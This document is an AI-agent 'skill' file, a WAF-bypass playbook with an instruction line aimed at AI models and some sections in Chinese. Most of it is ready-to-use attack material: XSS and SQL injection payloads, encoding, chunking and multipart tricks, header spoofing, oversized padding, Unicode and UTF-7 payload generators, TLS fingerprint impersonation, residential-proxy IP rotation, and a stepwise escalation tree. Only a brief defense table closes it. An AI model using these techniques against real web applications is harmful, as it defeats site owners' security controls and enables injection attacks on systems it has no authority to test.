---
name: waf-bypass-techniques
description: >-
  WAF bypass methodology and generic evasion techniques. Use when a web application
  firewall blocks injection payloads (SQLi, XSS, RCE) and you need to craft
  bypasses using encoding, protocol-level tricks, or WAF-specific weaknesses.
---

# SKILL: WAF Bypass Techniques — Evasion Playbook

> **AI LOAD INSTRUCTION**: Covers WAF identification, generic bypass categories (encoding, protocol abuse, HTTP/2, parameter pollution), and a decision tree. For product-specific bypasses (Cloudflare, AWS WAF, ModSecurity, Akamai, etc.), load [WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md). Base models often suggest basic encoding but miss protocol-level bypasses and WAF behavioral quirks.

## 0. RELATED ROUTING

- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for payloads to deliver after bypassing WAF
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS payloads that need WAF evasion
- [request-smuggling](../request-smuggling/SKILL.md) when smuggling can route requests around WAF entirely
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) HPP is itself a WAF bypass primitive
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) when WAF blocks inline scripts but CSP bypass is available
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) **Java backends only** — when every encoding trick above is blocked, use Ghost Bits: Java's 16-bit `char` to 8-bit `byte` narrowing produces 255 Unicode bypass variants per dangerous ASCII byte; re-enables WAF-patched CVEs in Tomcat, Spring, Jetty, Jackson, Fastjson, BCEL, and more

### Product-Specific Reference

Load [WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md) when you need per-product bypass techniques for Cloudflare, AWS WAF, ModSecurity CRS, Akamai, Imperva, F5 BIG-IP, or Sucuri.

---

## 1. PHASE 0 — IDENTIFY THE WAF

Before bypassing, know what you're fighting.

### 1.1 Tools

| Tool | Usage |
|---|---|
| `wafw00f target.com` | Fingerprint WAF vendor from response headers/behavior |
| `nmap --script=http-waf-detect` | NSE script for WAF detection |
| Manual header inspection | `Server`, `X-CDN`, `X-Cache`, `cf-ray` (Cloudflare), `x-sucuri-id`, `x-akamai-*` |

### 1.2 Behavioral Fingerprinting

```
1. Send benign request → record baseline response (status, headers, body size)
2. Send obvious attack: /?q=<script>alert(1)</script>
3. Compare: 403? Custom block page? Redirect? Connection reset?
4. Block page content reveals WAF: "Cloudflare", "Access Denied (Imperva)", "ModSecurity"
5. If transparent proxy: check response time difference (WAF adds latency)
```

---

## 2. GENERIC BYPASS CATEGORIES

### 2.1 Encoding Bypasses

| Technique | Example | Bypasses |
|---|---|---|
| URL encoding | `%3Cscript%3E` | Basic string matching |
| Double URL encoding | `%253Cscript%253E` | WAFs that decode once, app decodes twice |
| Unicode encoding | `%u003Cscript%u003E` | IIS-specific Unicode normalization |
| HTML entities | `&#60;script&#62;` or `&#x3c;script&#x3e;` | WAFs not performing HTML entity decoding |
| Hex encoding (SQL) | `0x756E696F6E` = `union` | WAFs matching SQL keywords |
| Octal encoding | `\74script\76` | Rare but some parsers handle it |
| Overlong UTF-8 | `%C0%BC` (invalid encoding for `<`) | Legacy parsers with loose UTF-8 handling |
| Mixed case | `SeLeCt`, `uNiOn` | Case-sensitive rule matching |
| Null byte | `sel%00ect` | WAFs that stop parsing at null |

### 2.2 Chunked Transfer Encoding

Split the payload across HTTP chunks so no single chunk contains the blocked pattern:

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

```

WAFs that inspect the full body may not reassemble chunks before matching.

### 2.3 HTTP/2 Binary Format Bypasses

HTTP/2 transmits headers as binary HPACK-encoded frames. Some WAFs only inspect after downgrading to HTTP/1.1:

- Header names can contain characters illegal in HTTP/1.1
- Pseudo-headers (`:method`, `:path`) bypass header-based WAF rules
- H2 → H1 downgrade may introduce request smuggling (see [request-smuggling](../request-smuggling/SKILL.md))

### 2.4 HTTP Parameter Pollution (HPP)

Different servers handle duplicate parameters differently:

| Server | Behavior for `?a=1&a=2` |
|---|---|
| PHP/Apache | Last value: `a=2` |
| ASP.NET/IIS | Concatenated: `a=1,2` |
| Python/Flask | First value: `a=1` |
| Node.js/Express | Array: `a=[1,2]` |

WAF checks `a=1` (benign), app uses `a=2` (malicious). Or combine: `a=sel&a=ect` → ASP.NET sees `a=sel,ect`.

### 2.5 IP Source Spoofing (Bypass IP-Based Rules)

Headers trusted by some WAFs/apps for client IP:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Use case: WAF whitelists internal IPs or has different rule sets per source.

### 2.6 Path Normalization Tricks

| Technique | Example | Effect |
|---|---|---|
| Dot segments | `/./admin` or `/../target/admin` | WAF sees different path than app |
| Double slash | `//admin` | Some normalizers collapse, WAFs may not |
| URL encoding path | `/%61dmin` | WAF sees encoded, app decodes |
| Null byte in path | `/admin%00.jpg` | Legacy: app truncates at null, WAF sees .jpg |
| Backslash (IIS) | `/admin\..\/secret` | IIS treats `\` as `/` |
| Trailing dot/space | `/admin.` or `/admin%20` | OS-level normalization (Windows) |
| Semicolon (Tomcat) | `/admin;jsessionid=x` | Tomcat strips after `;`, WAF may not |

### 2.7 Content-Type Manipulation

WAFs often have format-specific parsers. Switching Content-Type can bypass rules:

```
Default:  Content-Type: application/x-www-form-urlencoded  → WAF parses params
Switch:   Content-Type: application/json  → WAF may not parse JSON body
Switch:   Content-Type: multipart/form-data  → WAF may not inspect all parts
Switch:   Content-Type: text/xml  → WAF expects XML, payload in different format
```

**Trick**: If app accepts both JSON and form-urlencoded, use JSON — WAFs often have weaker JSON inspection rules.

### 2.8 Multipart Boundary Abuse

```http
Content-Type: multipart/form-data; boundary=----WAFBypass

------WAFBypass
Content-Disposition: form-data; name="q"

<script>alert(1)</script>
------WAFBypass--
```

Variations: long boundary strings, boundary with special characters, missing final boundary, nested multipart.

### 2.9 Newline & Whitespace Injection

```sql
-- SQL keyword splitting
SEL
ECT * FROM users

-- SQL comment insertion
SEL/**/ECT * FR/**/OM users
UN/**/ION SEL/**/ECT 1,2,3

-- Tab/vertical tab as separator
SELECT\t*\tFROM\tusers
```

### 2.10 Keyword Splitting & Alternative Syntax

| Blocked | Alternative |
|---|---|
| `UNION SELECT` | `UNION ALL SELECT`, `UNION DISTINCT SELECT` |
| `OR 1=1` | `OR 2>1`, `OR 'a'='a'`, `||1` |
| `<script>` | `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>` |
| `alert(1)` | `prompt(1)`, `confirm(1)`, `print()` (Chrome) |
| `eval()` | `Function('code')()`, `setTimeout('code',0)` |
| `' OR '1'='1` | `' OR 1-- -`, `'\|\|'1` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('x'))`, `pg_sleep(5)` |

### 2.11 Dirty Data, Oversized Payloads & Unicode Normalization

#### 2.11.1 脏数据填充 / 超长 payload（撑爆 WAF 长度上限）

WAF 普遍对请求体有**检测长度预算**（常见 8KB–128KB，依厂商/规则预算）。把 payload 藏在
大段**良性填充**之后，可能让检测器在预算耗尽前**还没扫到**危险片段。

```http
POST /search HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: <large>

pad=<8KB+ 的 'A' 或合法参数>&q=' OR '1'='1
```

- **超长参数名/值**：单个参数名或值做成数 KB–MB，超出规则引擎的字段长度上限。

```http
q=AAAAAAAA...<超长>&x=' UNION SELECT 1,2,3-- -
```

- **构造步骤**：
  1. 先测目标 WAF 的检测预算：递增 padding 长度，观察何时从「拦截」变「放行/静默剥离」。
  2. 把真实 payload 放到填充**之后**（或穿插在多个合法键值之间）。
  3. 用 multipart 的 file 字段承载填充 + 参数承载 payload（文件内容常不被深度检测）。
- **判据**：填充超过阈值后，后端**真实执行**了 payload（时间差/数据返回），而不仅是返回 200。
- 工具：Burp Repeater / Intruder 改 `Content-Length`，或用 Python `requests` 动态拼 body。

#### 2.11.2 Unicode 规范化绕过（NFKC / NFD）

WAF 与后端对 Unicode 的**规范化（normalization）不对称**是盲区：WAF 按字节/原始字符匹配，
后端（或语言运行时）先做 `NFKC`（兼容性合并，如全角→半角）或 `NFD`（分解，如带重音→基础+组合）
再解析。

```
NFKC: Ａ（全角 A, U+FF21）→ A（U+0041）
      ＜script＞（全角尖括号）→ <script>
NFD:  é（U+00E9）→ e（U+0065）+ ́（U+0301）
```

- **payload 变体**：

```text
# 全角绕过（NFKC 后端归一化后成为危险字符）
＜script＞alert(1)＜/script＞
ＳＥＬＥＣＴ ＊ ＦＲＯＭ ｕｓｅｒｓ

# 组合字符拆分（NFD 后端再组合/或按基础字符匹配）
s\u0065lect   # 'e' 的等价形式干扰关键字匹配
```

- **构造步骤**：
  1. 用 Python `unicodedata.normalize` 生成全角/分解变体。
  2. 确认后端确实规范化（看反射/行为是否归一化）。
  3. 组合「规范化 + 编码」多级叠加。
- **工具**：

```python
import unicodedata
s = "<script>alert(1)</script>"
# NFKC 兼容性合并（全角→半角）
full = s.translate(str.maketrans({c: chr(0xFEE0 + ord(c)) for c in s if 0x21 <= ord(c) <= 0x7E}))
nfkc = unicodedata.normalize("NFKC", full)   # 还原为 <script>...
# NFD 分解（重音拆分）
nfd = unicodedata.normalize("NFD", "é")
```

- **判据**：后端把全角/分解形式当作危险字符执行（XSS 触发/SQL 生效），而 WAF 未拦截 = 规范化不对称。

#### 2.11.3 UTF-7 / UTF-16 编解码构造

**UTF-7**：老式邮件/兼容编码，`<`→`+ADw-`、`>`→`+AD4-`。对不做 UTF-7 解码的 WAF，`<script>`
被编码后字符串匹配失效，而老后端可能解码。

```
原始: <script>alert(1)</script>
UTF-7: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

**UTF-16**：`%u003C` 或字节级 `\x00<`（BOM 后每字符双字节）。IIS 等历史上有 `%uXXXX` 解码。

```
原始: <script>
%u 形式: %u003Cscript%u003E
字节级(LE): \x3c\x00s\x00c\x00...
```

- **构造步骤**：
  1. 用 `iconv`/Python 生成 UTF-7/UTF-16 字节。
  2. URL 编码后注入，观察后端是否解码执行。
- **工具**：

```bash
# UTF-7 编码（iconv）
echo -n '<script>alert(1)</script>' | iconv -f UTF-8 -t UTF-7
# 输出: +ADw-script+AD4-alert(1)+ADw-/script+AD4-

# UTF-16LE 编码（Python）
python3 -c "print('<script>'.encode('utf-16le').hex())"
```

- **判据**：仅当后端**确实解码** UTF-7/UTF-16 才成立；若后端按原样返回编码串，则不是绕过。
  见 `../zh/tools/tools-encoding.md` 的完整编解码命令。

---

## 3. PROTOCOL-LEVEL BYPASS TECHNIQUES

### 3.1 Request Line Abuse

```http
GET /path?q=attack HTTP/1.1    ← WAF inspects
```

vs.

```http
GET http://target.com/path?q=attack HTTP/1.1   ← Absolute URI: some WAFs miss the path
```

### 3.2 Header Injection via CRLF

If WAF inspects original headers but app processes injected ones:

```
X-Custom: value\r\nX-Forwarded-For: 127.0.0.1
```

### 3.3 Connection-State Bypass

```
1. Establish connection through WAF (normal request)
2. On same keep-alive connection, send attack request
3. Some WAFs reduce inspection on subsequent requests in same connection
```

### 3.4 TLS Fingerprint (JA3/JA4) & IP Reputation Bypass

Modern WAFs/bot-managers block based on **TLS client fingerprint** (JA3/JA4) and **IP reputation**
before your payload is ever parsed. If your tool's TLS/HTTP fingerprint looks like `curl`/`python-requests`
or a datacenter IP, you get 403/429 **regardless of payload**. Fix the fingerprint, then test payloads.

#### 3.4.1 识别被指纹拦截

- 同一请求：浏览器 200，脚本/工具 403/429/challenge。
- 响应含 bot 相关标识（Cloudflare `cf-mitigated: challenge`、Akamai reference、Sucuri block）。
- 换真实浏览器（同 IP）通过 = 命中 TLS/UA 指纹，而非 payload。

#### 3.4.2 JA3 / JA4 规避

- **JA3** = `TLSVersion,Ciphers,Extensions,EllipticCurves,ECPointFormats` 的 MD5。
- **JA4** = 更细的 `QUIC`/TCP + TLS 指纹（`tls_ja4`），2024+ 兴起。
- 工具指纹检测：`ja3er.com`、`github.com/salesforce/ja3`、`wireshark`（`tls.handshake.ja3`）。

```
# curl 指纹定制（授权环境）
curl --tlsv1.2 --ciphers '...' --http2 -A "Mozilla/5.0 ..." \
  -H 'Accept-Language: en-US,en;q=0.9' https://target.example.com/

# 用 TLS 指纹伪装库（如 curl-impersonate）
# 让 curl 发出的 JA3/JA4 与 Chrome/Firefox 一致
```

- **核心**：让 TLS 版本/密码套件/扩展顺序/ALPN 与真实浏览器一致，而不只是改 UA。
- 工具：`curl-impersonate`（impersonate Chrome/Firefox 指纹）、`tls-client`、`ja3transport`。

#### 3.4.3 IP 信誉轮换

- WAF 对数据中心/VPN/云 IP 段（AWS/Azure/GCP/常见 VPS）直接信誉降级。
- **轮换**：住宅代理池 / 移动 IP 池轮换源 IP，每轮换一次换一次「信誉分」。
- **节奏**：控制每 IP 的请求频率，避免「同指纹 + 多 IP 高频」被关联封禁。
- **CDN 源直达**：若拿到 origin IP（见 `../cdn/fuck-cdn.md`），直连绕开 CDN 侧 WAF 与信誉层。

#### 3.4.4 判据

- 定制 TLS 指纹 + 住宅 IP 后，同一 payload 由 403 → 后端真实执行 = 指纹/IP 层绕过成立。
- 仅改 UA 仍 403 = 说明是 JA3/JA4 或 IP 层，继续按本节处理。

---

## 4. WAF BYPASS DECISION TREE

```
Payload blocked by WAF?
├── Identify WAF (wafw00f, response headers, block page)
│
├── Try encoding bypasses
│   ├── URL encode payload → still blocked?
│   ├── Double URL encode → still blocked?
│   ├── Unicode/overlong UTF-8 → still blocked?
│   ├── Mixed case keywords → still blocked?
│   └── HTML entities (for XSS) → still blocked?
│
├── Try protocol-level bypasses
│   ├── Switch Content-Type (JSON, multipart, XML)
│   │   └── App accepts alternate format? → re-send payload
│   ├── HTTP Parameter Pollution (duplicate params)
│   ├── Chunked Transfer-Encoding to split payload
│   ├── HTTP/2 direct if available (binary framing bypass)
│   └── Request line: absolute URI format
│
├── Try path-based bypasses
│   ├── Path normalization (/./path, //path, ;param)
│   ├── Different HTTP method (POST vs PUT vs PATCH)
│   └── Alternate endpoint serving same function
│
├── Try payload mutation
│   ├── SQL: comments (/**/), alternative functions, hex literals
│   ├── XSS: alternative tags/events, JS template literals
│   ├── RCE: wildcard abuse, string concatenation, variable expansion
│   └── Check WAF_PRODUCT_MATRIX.md for vendor-specific mutations
│
├── Try IP-source bypass
│   ├── X-Forwarded-For / True-Client-IP spoofing
│   ├── Access origin server directly (bypass CDN)
│   └── Find origin IP (Shodan, historical DNS, email headers)
│
└── Try request smuggling to skip WAF entirely
    └── See ../request-smuggling/SKILL.md
```

---

## 5. COMMON MISTAKES & TRICK NOTES

1. **Test bypass with actual exploitation, not just 200 OK**: WAF may return 200 but strip the payload silently.
2. **WAFs often have size limits**: Very large request bodies (>8KB–128KB depending on WAF) may bypass inspection entirely.
3. **Rate limiting ≠ WAF**: Getting 429s is rate limiting, not payload blocking. Different bypass needed.
4. **CDN caching**: If the WAF is at CDN level, cached responses bypass WAF on subsequent requests. Poison cache with clean request, exploit cache.
5. **Origin server direct access**: If you find the origin IP behind CDN/WAF, connect directly — WAF is bypassed completely.
6. **Multipart file upload fields**: WAFs often skip inspection of file content in multipart uploads — embed payload in filename or file content if reflected.

---

## 6. DEFENSE PERSPECTIVE

| Measure | Notes |
|---|---|
| WAF + application-level input validation | WAF is a layer, not a fix |
| Parameterized queries | Eliminates SQLi regardless of WAF |
| CSP + output encoding | Eliminates XSS regardless of WAF |
| Regularly update WAF rules | Vendor signatures lag behind new bypasses |
| Deny by default, not block-list | Allowlist valid input patterns |
| Log and alert on WAF blocks | Bypass attempts are visible in logs |
